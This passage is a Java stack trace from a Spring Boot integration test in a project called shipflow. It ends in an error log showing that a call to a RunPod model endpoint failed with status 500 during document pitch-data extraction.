	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest.extractPitchData_withTextDocument_shouldExtractShapeUpFields(DocumentControllerIntegrationTest.java:269) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:44.965Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.PitchShapingExtractorService   : Error extracting pitch data from document: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:44.950958","status":500}

java.lang.RuntimeException: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:44.950958","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:92) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchShapingExtractorService.extractFromDocument(PitchShapingExtractorService.java:114) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentController.extractPitchDataFromDocument(DocumentController.java:247) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
